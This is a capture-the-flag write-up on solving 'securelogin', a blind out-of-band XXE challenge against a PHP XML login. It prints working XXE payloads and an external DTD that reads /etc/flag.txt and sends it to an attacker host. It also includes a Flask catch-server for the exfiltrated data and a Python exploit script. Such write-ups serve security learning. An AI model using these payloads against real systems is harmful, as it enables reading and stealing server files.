# Secure-login

## Introduction
Securelogin was a really fun and pretty tough challenge that I spent a whole weekend solving. Apparently it was based on a real world application.

The application was a XML login that was vulnerable to out-of-band XML external entity. (OOB XXE) attack. However the server didn't allow many ports which made getting a response a lot harder. 

## Application enumeration
Let's begin analyzing the front page of the challenge http://securelogin.challenge.fi:8880/

Front page didn't have anything interesting other than some meme and following messages: `"YoU Sh4lL N0t P4SS!"` and `"Here is the first development version of securelogin for backends, very sEcURe It Is!"`

If the page doesn't provide any interesting, I like to check the source because there might be some comments left behind. 

And the developer had forgotten a comment which exposes a new page: `/xml.php` with odd request that looks like base64. 
```
<!--

Debug info, remember to remove before moving to prod:

  

POST /xml.php HTTP/1.1

Host: localhost:9999

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 164

  

xml=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8Y3JlZHM%2bCgk8dXNlcj51c2VybmFtZTwvdXNlcj4KCTxwYXNzPnBhc3N3b3JkPC9wYXNzPgo8L2NyZWRzPg%3d%3d

  

\-->
```

Because I found a new page, running a gobuster seemed like a good idea to see if there were more hidden pages. Gobuster indeed found a one more page: `/flag`. Well that challenge was a easy one. Sadly, it wasn't. The page just contained a message from the creators and some music to listen while solving. 
```
THIS IS NOT THE REAL FLAG! :)

TRY HARDER!

Gr33tz t0 T34M R0T!

Here is some muzak for you to listen while doing this:
https://www.youtube.com/watch?v=c6tQzMhqhLc
https://www.youtube.com/watch?v=l9cnQbtR0h4
```

Now lets get back to the `http://securelogin.challenge.fi:8880/xml.php` page as the comment of the request looked rather interesting. 

## Understading the xml.php file. 
When I first loaded the /xml.php, it took longer than usual to display the page. After loading, the page just displayed a message `Username or password not found! Try Harder!` 

The weird comment in the front page had some weird data included with a post request. I was pretty sure it was base64 so I decided to decode it. 
`xml=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iSVNPLTg4NTktMSI/Pgo8Y3JlZHM%2bCgk8dXNlcj51c2VybmFtZTwvdXNlcj4KCTxwYXNzPnBhc3N3b3JkPC9wYXNzPgo8L2NyZWRzPg%3d%3d`

Decoded version of the data looked super weird so I URL decoded it before b64 decoding. Now the data made more sense. It was a XML payload for login!
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<creds>
	<user>username</user>
	<pass>password</pass>
</creds>
```

After figuring that out, naturally I tried default credentials many times. Even automated some bruteforce, but it didn't result to anything. 

Because the login used XML, I thought that the challenge involves XML External Entity (XXE) or xpath injection -vulnerability. The XXE or xpath injection wasn't very familiar to me, so I spent a good amount of time studying about it. Challenge description said that flag is located in a file `/etc/flag.txt` which implies we need to access the server so XXE was the way to go.
You can read more about it here: https://portswigger.net/web-security/xxe

## Exploitation
Like every hacker, I went to [PayloadAllThings]( https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection) and started testing all of those payloads, one by one. 

After many hours of testing and thinking and server responding every time with the same annoying message: `Try HARDER!`. Server just didn't want to respond anything. It was completely blind. I tried setting up a own VPS that the server would send a some kind of response but nothing showed up. 

Sometimes the challenge server did return `500 Internal Server Error`, but nothing really came from that. 

Most of the times we tried to use http, base64 or php protocols in our payloads. For example: `<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://host/%data;'>">` but luckily one guy in our group found out that if you changed the protocol from http to ftp, server did return a different response: `Protocol: FTPUsername or password not found! Try Harder!`.  Atleast because of different response, we officially knew that XXE was a right attack type. 

The hard part is to figure out how to take advantage of server possibly allowing FTP access. I spent many hours trying to set up a proper FTP server to my VPS and then trying to connect. I actually made the server connect to my ftp but it was really inconsistent and I couldn't download any files. 

Also even if I was able to download files what how would I execute that file. Then I thought about using an external XML file because that way we could read files locally. Only problem with this idea is that I couldn't get FTP to work properly. 

If FTP is allowed that means the server allows traffic on port 21. So I started listening traffic on port 21 in my VPS and sent a payload that uses http protocol and connects to port 21. 
```xml
<?xml version="1.0" ?>
<!DOCTYPE r [
	<!ELEMENT r ANY>
	<!ENTITY % sp SYSTEM "http://x.x.x.x:21/">%sp;%param1;]><r>&exfil;</r>
```

And luckily it pinged my server. 

Now all I had left is to craft a valid xml payload that the vulnerable server could fetch from my server and then execute it. 

So I created a exp.xml file
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/flag.txt">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://ip:21/%data;'>">
```

After that I created a custom web server with flask that would send the exp.xml file and then return the flag. 

```python
from flask import send_file, send_from_directory, safe_join, abort
from flask import Flask
from base64 import b64decode
app = Flask(__name__)

@app.route('/exp.xml')
def hello_world():
    print("Fecthing exploit")
    return send_file("exp.xml")

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    flag = b64decode(path.encode("ascii")).decode()
    print("[+] Flag: "+flag)
    return "[+] Flag:", flag

if __name__ == '__main__':
      app.run(host='0.0.0.0', port=21)

```

Finally I crafted a exploit with python that would send xml code to the server. The xml payload would then retrieve exp.xml and execute it which returns the flag as base64 encoded. Luckily my webserver decodes it automatically. 

```python
import requests
from base64 import b64encode, b64decode
from urllib.parse import quote
import sys

def exploit(url, host):

    #Headers
    headers = {
      'Content-Type': 'application/x-www-form-urlencoded'
    }

    #Craft the payload
    payload = f'<?xml version="1.0" ?><!DOCTYPE r [<!ELEMENT r ANY><!ENTITY % sp SYSTEM "http://{host}/exp.xml">%sp;%param1;]><r>&exfil;</r>'.encode('ascii')

    #print the payload
    print("[+] Payload:")
    print(payload.decode())
    print()

    #Encode payload to base64
    payload = {"xml":b64encode(payload).decode('ascii')}

    #print the payload encoded
    print("[+] Payload encoded:")
    print(payload)
    print()

    #Send the payload
    print(f"[*] Sending payload to:", url)
    r = requests.post(url, data=payload, headers=headers)

    #Print response data
    print(f"[+] Status:", r.status_code)
    print(f"[+] Message:\n"+ r.content.decode())
    print(f"[+] Time:", r.elapsed.total_seconds())
    print(f"[+] Headers:")
    for i in r.headers:
        print("\t",i, ":", r.headers[i])

if __name__ == '__main__':
    #Challenge Url
    url = "http://securelogin.challenge.fi:8880/xml.php"

    #OOB Host
    host = "ip:21"

    #Php payload checker
    check_url = "http://localhost:8081"

    if len(sys.argv) == 1:
        print("[!] Usage: python exploit.py <option>")
        sys.exit()
    if sys.argv[1] == "t":
        exploit(check_url, host)
    if sys.argv[1] == "e":
        exploit(url, host)

```
That's how I solved securelogin. Hard but super fun challenge which taught me a lot of new things.  
